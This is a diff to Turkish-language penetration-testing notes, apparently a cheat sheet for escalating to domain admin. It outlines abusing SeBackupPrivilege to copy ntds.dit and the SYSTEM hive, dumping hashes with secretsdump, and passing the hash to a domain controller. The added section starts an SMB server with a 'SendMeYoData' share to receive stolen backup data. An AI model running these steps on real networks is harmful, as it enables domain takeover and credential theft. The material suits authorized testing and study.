@@ -114,3 +114,9 @@ evil-winrm -i <DC_IP> -u Administrator -H <NT_hash>
 `whoami /priv` (SeBackupPrivilege var mı) → DLL import + enable → diskshadow script (`/s`) ile shadow copy oluştur ve mount et → `robocopy /b` ile ntds.dit + `reg save` ile SYSTEM hive'ı çek → indir → `secretsdump.py` ile hash çıkar → `nxc`/`evil-winrm` ile PtH.
 
 Her adım başarısız olursa pivot: diskshadow çalışmıyorsa (yazma izni hiçbir yerde yoksa) alternatif olarak `wbadmin` ile sistem yedeği alıp NTDS'i oradan çekmeyi dene; SeBackupPrivilege hiç yoksa bu yol tamamen kapalıdır, farklı bir local privesc/credential dump vektörüne (LAPS, GPP, kerberoasting vb.) geç.
+
+# SeBackupPrivilege Abuse with wbadmin.exe
+
+```sh
+sudo impacket-smbserver -smb2support SendMeYoData Pass123.
+```
